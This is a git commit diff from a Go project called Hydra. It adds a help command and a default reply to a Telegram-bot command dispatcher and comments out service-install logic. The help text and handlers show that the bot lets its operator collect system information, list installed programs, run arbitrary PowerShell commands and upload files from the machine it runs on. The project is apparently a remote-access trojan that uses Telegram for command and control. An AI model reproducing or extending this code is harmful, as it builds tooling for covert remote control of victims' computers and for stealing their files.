b71e3dbf85616509c40e7884857dc810aa65b69f
Raffy27 <raffy27@pm.me>
2021-03-03 10:24:56 +0200

    Help command

--- commands/select.go
+++ commands/select.go
@@ -1,11 +1,34 @@
 package commands
 
 import (
+	"github.com/Raffy27/Hydra/api"
+	"github.com/Raffy27/Hydra/util"
 	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
 )
 
+const (
+	help = "```\nhelp - display this help message\nping - measure the latency of command execution\n" +
+		"reset - create a new Genesis message\ninfo - display system information\nsoftware - display the list of installed programs\n" +
+		"sh - execute a PowerShell command and return the output\nfile - upload a file from the local system\n```"
+	unknown = "Wat is this? America explain!!"
+)
+
+func sendHelp() {
+	cfg := tgbotapi.NewMessage(util.ChatID, help)
+	cfg.ParseMode = "Markdown"
+	api.Bot.Send(cfg)
+}
+
+func sendUnknown() {
+	cfg := tgbotapi.NewMessage(util.ChatID, unknown)
+	api.Bot.Send(cfg)
+}
+
+//Perform selects the appropriate command handler.
 func Perform(message *tgbotapi.Message) {
 	switch message.Command() {
+	case "help":
+		sendHelp()
 	case "ping":
 		Ping()
 	case "reset":
@@ -18,5 +41,7 @@ func Perform(message *tgbotapi.Message) {
 		Shell(message.CommandArguments())
 	case "file":
 		UploadFile(message.CommandArguments())
+	default:
+		sendUnknown()
 	}
 }
--- main.go
+++ main.go
@@ -1,27 +1,15 @@
 package main
 
 import (
-	"fmt"
-	"io/ioutil"
 	"log"
-	"os"
 
 	"github.com/Raffy27/Hydra/api"
 	"github.com/Raffy27/Hydra/commands"
-	"github.com/Raffy27/Hydra/install"
-	"golang.org/x/sys/windows/svc"
 )
 
-func checkthisshit() {
-	if r := recover(); r != nil {
-		ioutil.WriteFile("C:\\Users\\Raffy\\Desktop\\Panic.txt", []byte(fmt.Sprint(r)), 0644)
-	}
-}
-
 func main() {
-	defer checkthisshit()
 
-	if os.Getenv("nocheck") == "" {
+	/*if os.Getenv("nocheck") == "" {
 		if chk, _ := svc.IsWindowsService(); chk {
 			install.HandleService(main)
 		}
@@ -30,7 +18,7 @@ func main() {
 		} else {
 			log.Println("Already installed")
 		}
-	}
+	}*/
 
 	log.Println("Logged in as", api.Bot.Self.UserName)
 	//api.NewGenesis()
